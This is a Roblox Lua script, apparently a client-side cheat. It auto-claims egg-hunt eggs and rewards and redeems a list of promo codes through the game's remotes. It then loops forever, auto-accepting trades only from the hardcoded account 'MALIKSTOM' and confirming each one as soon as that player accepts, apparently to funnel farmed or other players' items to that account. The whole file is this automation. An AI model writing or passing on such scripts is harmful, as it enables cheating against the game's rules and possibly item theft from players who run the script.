local rs = game:GetService("ReplicatedStorage")
local player = game.Players.LocalPlayer
local paper = require(rs:WaitForChild("Paper"))
local remotes = rs:WaitForChild("Paper"):WaitForChild("Remotes")
local tradeRemote = remotes.Trade

local targetName = "MALIKSTOM"

local function hasAnyItems()
    local itemsData = paper.Stats.Get("Items").Value
    for itemName, amount in pairs(itemsData) do
        if amount > 0 then
            return true
        end
    end
    return false
end

local function farmEggsAndCodes()
    print("[AUTO] Farming eggs and codes first...")
    
    -- Egg Hunt
    local eggHuntConfig = require(rs:WaitForChild("Tables").EggHunt)
    local stats = paper.Stats
    
    for eggName, _ in pairs(eggHuntConfig) do
        pcall(function()
            paper.Network.InvokeServer("Claim Egg", eggName)
        end)
        task.wait(0.1)
    end
    print("[AUTO] Egg claiming done")
    task.wait(1)
    
    -- Claim egg rewards
    local eggHuntData = stats.Get("EggHuntData")
    local foundEggs = eggHuntData.Value.FoundEggs or {}
    local claimedEggs = eggHuntData.Value.ClaimedEggs or {}
    
    for eggName, _ in pairs(foundEggs) do
        if not claimedEggs[eggName] then
            pcall(function()
                paper.Network.InvokeServer("Claim Egg Reward", eggName)
            end)
            task.wait(0.1)
        end
    end
    print("[AUTO] Egg rewards claimed")
    task.wait(1)
    
    -- Redeem codes
    local codes = {
        "update1", "update2", "update3", "update4", "update5",
        "easter", "10kccu", "RELEASE"
    }
    
    local remote = rs:WaitForChild("Paper"):WaitForChild("Remotes"):WaitForChild("__remotefunction")
    
    for _, code in ipairs(codes) do
        pcall(function()
            remote:InvokeServer("Redeem Code", code)
        end)
        task.wait(0.5)
    end
    print("[AUTO] Codes redeemed")
end

local function acceptTradeRequest(targetPlayer)
    remotes["Accept Trade Request"]:FireServer(targetPlayer)
    print("Accepted trade request from:", targetPlayer.Name)
end

local function findAndAcceptRequest()
    -- Check if you have items AFTER egg hunt
    if not hasAnyItems() then
        print("No items in inventory, waiting for items...")
        return false, nil
    end
    
    local playerGui = player:WaitForChild("PlayerGui")
    local main = playerGui:FindFirstChild("Main")
    if not main then return false, nil end
    
    local requestsFrame = main:FindFirstChild("Requests")
    if not requestsFrame then return false, nil end
    
    local requests = {}
    for _, request in requestsFrame:GetChildren() do
        if request:IsA("Frame") and request.Name ~= "UIListLayout" then
            table.insert(requests, request)
        end
    end
    
    for _, request in ipairs(requests) do
        local requesterName = request.Name
        if requesterName == targetName then
            local targetPlayer = game.Players:FindFirstChild(requesterName)
            if targetPlayer then
                acceptTradeRequest(targetPlayer)
                return true, targetPlayer
            end
        end
    end
    return false, nil
end

local function waitForOtherToAccept()
    local menus = player.PlayerGui:WaitForChild("Menus")
    local tradingFrame = nil
    local timeout = 0
    
    repeat
        task.wait(0.5)
        timeout = timeout + 0.5
        tradingFrame = menus:FindFirstChild("Trading")
        if timeout >= 10 then
            print("Timeout waiting for trade UI")
            return false
        end
    until tradingFrame and tradingFrame:FindFirstChild("Frame")
    
    local frame = tradingFrame.Frame
    timeout = 0
    
    repeat
        task.wait(0.1)
        timeout = timeout + 0.1
        if timeout >= 5 then
            print("Timeout waiting for trade UI to load")
            return false
        end
    until frame.My and frame.Other
    
    print("In trade, waiting for other player to accept...")
    timeout = 0
    
    while timeout < 120 do
        if frame.Other.Accepted and frame.Other.Accepted.Visible then
            print("Other player accepted, now accepting...")
            tradeRemote:FireServer("Accept")
            task.wait(1)
            return true
        end
        
        if frame.Countdown and frame.Countdown.Visible then
            print("Countdown started, trade will complete automatically")
            return true
        end
        
        if not menus:FindFirstChild("Trading") then
            print("Trade UI closed - trade was canceled")
            return false
        end
        
        task.wait(0.5)
        timeout = timeout + 0.5
    end
    
    print("Timeout waiting for other player to accept")
    return false
end

-- MAIN SCRIPT
print("Auto trade starting...")

-- FIRST: Farm eggs and redeem codes to get items
farmEggsAndCodes()
print("Farm complete, now waiting for trade requests from " .. targetName)

-- THEN: Only accept trades if you have items
while true do
    if hasAnyItems() then
        local found, targetPlayer = findAndAcceptRequest()
        
        if found then
            print("Found request from: " .. targetPlayer.Name)
            task.wait(1.5)
            
            local success = waitForOtherToAccept()
            
            if success then
                print("Trade completed successfully with: " .. targetPlayer.Name)
                task.wait(3)
            else
                print("Trade failed with: " .. targetPlayer.Name)
                task.wait(2)
            end
        else
            task.wait(0.5)
        end
    else
        print("No items available, waiting...")
        task.wait(5)
    end
end
